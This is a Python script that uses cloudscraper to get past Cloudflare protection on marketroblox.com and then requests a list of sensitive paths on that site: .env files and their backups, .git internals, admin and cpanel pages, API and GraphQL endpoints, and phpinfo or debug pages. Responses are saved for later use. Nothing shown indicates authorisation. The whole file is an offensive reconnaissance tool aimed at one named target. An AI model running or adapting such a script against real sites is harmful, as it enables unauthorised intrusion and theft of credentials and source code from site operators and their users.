#!/usr/bin/env python3
"""Cloudflare bypass + content download for marketroblox.com enumeration"""

import cloudscraper
import json
import os
import sys
import re
import time
from urllib.parse import urlparse, urljoin

TARGET = "https://marketroblox.com"
OUT_DIR = "/home/ubuntu/marketroblox.store/enum"

scraper = cloudscraper.create_scraper(
    browser={
        "browser": "chrome",
        "platform": "windows",
        "desktop": True,
        "mobile": False,
    },
    delay=5,
    interpreter="native",
)

def fetch(url, output_name=None, retries=3):
    for attempt in range(retries):
        try:
            resp = scraper.get(url, timeout=30, allow_redirects=True)
            print(f"[{resp.status_code}] {url} ({len(resp.content)} bytes)")
            if output_name:
                path = os.path.join(OUT_DIR, output_name)
                with open(path, "wb") as f:
                    f.write(resp.content)
                print(f"  -> saved {path}")
            return resp
        except Exception as e:
            print(f"  attempt {attempt+1} failed: {e}")
            time.sleep(3)
    return None

# 1. Download homepage
fetch(TARGET + "/", "homepage.html")

# 2. JS files
fetch(TARGET + "/mod/js/main.js", "main_js.js")
fetch(TARGET + "/public/client/js/main.js", "client_js.js")

# 3. Admin & cpanel
fetch(TARGET + "/admin", "admin_login.html")
fetch(TARGET + "/cpanel", "cpanel_page.html")

# 4. API root
fetch(TARGET + "/api", "api_root.html")

# 5. Try bypass paths for .env
for path in [".env", ".env.bak", ".env.old", ".env.local", ".env.production",
             ".env.backup", ".env.dev", ".env.save", "admin/.env", "api/.env"]:
    fetch(TARGET + "/" + path, None)

# 6. Try bypass paths for .git
for path in [".git/HEAD", ".git/config", ".git/index",
             ".git/refs/heads/master", ".git/logs/HEAD"]:
    fetch(TARGET + "/" + path, None)

# 7. Common API endpoints
for path in ["api/v1", "api/v2", "api/users", "api/orders", "api/products",
             "api/login", "api/register", "api/swagger", "api/docs",
             "api/openapi.json", "swagger", "openapi.json",
             "graphql", "api/graphql"]:
    fetch(TARGET + "/" + path, None)

# 8. mod/ endpoints
for path in ["mod/login", "mod/admin", "mod/config", "mod/users", "mod/api",
             "mod/"]:
    fetch(TARGET + "/" + path, None)

# 9. Info disclosure
for path in ["logs", "error", "debug", "backup", "phpinfo.php",
             "info.php", "test.php", "robots.txt", "sitemap.xml",
             "crossdomain.xml", "well-known/", ".well-known/security.txt"]:
    fetch(TARGET + "/" + path, None)

print("\n=== ALL DOWNLOADS COMPLETE ===")